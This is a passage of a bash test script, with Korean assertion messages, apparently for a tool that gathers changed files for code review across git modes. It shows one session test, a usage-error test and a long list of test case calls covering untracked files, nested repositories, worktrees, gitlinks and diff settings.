  OUT=$(cd "$R/src" && bash "$RDIFF" --dir "$D" --iter 2 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(sort "$D/review-i2.names" | tr '\n' ' ')" "README.md src/a.py " "names 는 최상위 기준 경로"
  assert_eq "$(field excluded "$OUT")" 1 "README 제외"
}

case_usage() {
  echo "[사용 오류]"
  mkfix
  rd --mode bogus
  assert_eq "$RC" 2 "모르는 모드 rc 2"
  OUT=$(cd "$R" && bash "$RDIFF" --dir "$D" --iter 0 --mode session 2>/dev/null); RC=$?
  assert_eq "$RC" 2 "iter 0 rc 2"
  rd --mode range
  assert_eq "$RC" 2 "range 에 scope-file 없음 rc 2"
}

case_session_includes_untracked
case_session_doc_excluded
case_range_uses_frozen_pair
case_topic_uses_boundary_tree
case_settings_change_falls_back
case_filtered_empty
case_degraded_session
case_paths_mode
case_no_ext_diff
case_no_textconv
case_doc_rename
case_literal_pathspecs_env
case_self_state_not_reviewed
case_self_state_grammar
case_grammar_covers_state_file_format
case_self_state_bound_to_run_dir
case_unregistered_worktree_folder_reviewed
case_dir_outside_repo_skips_nothing
case_registered_worktree_only_not_degraded
case_excluded_prefix_not_swallowed
case_name_reconcile_catches_missing
case_all_excluded_no_pathspec
case_other_session_worktree_degraded
case_keep_batches
case_mdx_reviewed_as_code
case_nested_repo_disclosed
case_nested_repo_reviewed_safely
case_nested_list_failure
case_nested_tracked_files
case_nested_unsafe_git_files
case_nested_registered_worktree
case_nested_file_cap
case_gitlink_no_git_inside
case_submodule_diff_format_pinned
case_session_staged_gitlink_degraded
case_branch_committed_gitlink_degraded
case_ignore_all_cannot_hide_gitlink
case_topic_new_gitlink_disclosed
case_range_new_gitlink_degraded
case_degraded_blocks_certification
case_untracked_symlink_to_dir
case_dir_link_no_repo_named_dirs
case_tracked_under_self_dir_reviewed
case_settings_local
case_from_subdir
case_usage
finish
